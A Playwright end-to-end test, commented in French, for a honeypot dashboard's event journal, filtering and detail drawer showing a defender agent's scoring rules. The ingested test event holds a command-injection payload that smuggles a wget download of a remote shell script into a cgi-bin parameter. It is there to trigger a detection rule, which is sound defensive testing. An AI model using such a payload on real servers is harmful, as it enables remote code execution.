import { expect, test } from "@playwright/test";
import { ingest, login } from "./helpers";

test("parcours 2 — filtrer le journal et ouvrir le détail avec les règles", async ({ page, request }) => {
  const username = `e2e-journal-${Date.now()}`;
  // Une injection de commande sur le leurre HTTP : R-010 doit se déclencher.
  await ingest(request, {
    service: "http",
    username,
    password: "admin",
    payload: "GET /cgi-bin/x?cmd=;wget http://198.51.100.9/x.sh;sh HTTP/1.1\r\nHost: decoy\r\n\r\n",
    source_ip: "198.51.100.23",
  });
  await ingest(request, { service: "ssh", username: "bruit-ssh" });

  await login(page, "/#/journal");
  await page.getByLabel("Service").selectOption("http");
  await expect(page).toHaveURL(/service=http/);
  const table = page.getByRole("region", { name: "Journal des événements" });
  await expect(table.getByText("bruit-ssh")).toHaveCount(0);

  await table.getByRole("row", { name: new RegExp(username) }).click();
  const drawer = page.getByRole("dialog");
  await expect(drawer.getByRole("heading", { name: "Verdict de l'agent défenseur" })).toBeVisible();
  // Le verdict explique le score règle par règle, et la somme égale le score (invariant 2).
  await expect(drawer.locator(".rules__list li").first()).toBeVisible();
  await expect(drawer.getByText("Somme des contributions")).toBeVisible();
  await expect(drawer.locator(".rules__total--broken")).toHaveCount(0);
  await expect(drawer.getByRole("heading", { name: "Session de cet attaquant" })).toBeVisible();

  await page.keyboard.press("Escape");
  await expect(drawer).toHaveCount(0);
});
